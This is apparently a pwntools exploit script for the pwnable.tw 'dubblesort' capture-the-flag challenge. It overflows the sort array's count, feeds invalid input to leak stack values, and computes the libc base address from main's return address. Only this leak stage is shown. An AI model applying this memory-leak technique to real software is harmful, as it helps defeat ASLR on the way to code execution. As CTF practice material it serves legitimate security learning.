#!/usr/bin/env python3
from pwn import *

DWORD = 4
DUMMY = 0xdeadbeef

elf = ELF("./given/dubblesort")
libc = None
def conn():
    global libc
    if args.REMOTE:
        p = remote("chall.pwnable.tw", 10101)
        libc = ELF("./given/libc_32.so.6")
    else:
        p = process([elf.path])
        libc = ELF("/lib/i386-linux-gnu/libc.so.6")
        if args.D:
            LEAK_DBG = "b *main + 319"
            gdb.attach(p, LEAK_DBG)
    return p

def leak_libc_base():
    # info: pwndbg
    num_dword_b4_canary = (0x7c - 0x1c) // DWORD
    num_dword_to_ret = (0x7c + DWORD + DWORD) // DWORD

    p = conn()

    p.recvuntil(b"What your name :")
    p.send(b"\x00" * 0x40)

    n = num_dword_to_ret + 8
    print("number to solve", n)
    p.recvuntil(b"How many numbers do you what to sort :")
    p.sendline(str(n).encode())

    p.recvuntil(b"Enter the 0 number :")
    p.sendline(b"a")

    p.recvuntil(b"Result :\n", timeout=5)

    leak = p.recvline(timeout=10)
    if b"***" in leak:
        leak = leak[:leak.find(b" ***")]
    addr_array = leak.strip().split(b" ")

    # attach gdb to find this
    main_ret = int(addr_array[24])
    print("leak:", hex(main_ret))

    # objdump the libc to find where main returns
    # keyword: libc_start_main or libc_start_call_main
    if args.REMOTE:
        main_ret_offset = 0x18637
        libc.address = main_ret - main_ret_offset
    else:
        libc_start_call_main_offset = 0x214a0# ubuntu 22.04
        main_ret_offset = libc_start_call_main_offset + 121
        # for some reasons, the __libc_start_call_main cannot be found in
        # the symbol table
    libc.address = main_ret - main_ret_offset
    p.sendline()

if __name__ == '__main__':
    leak_libc_base()
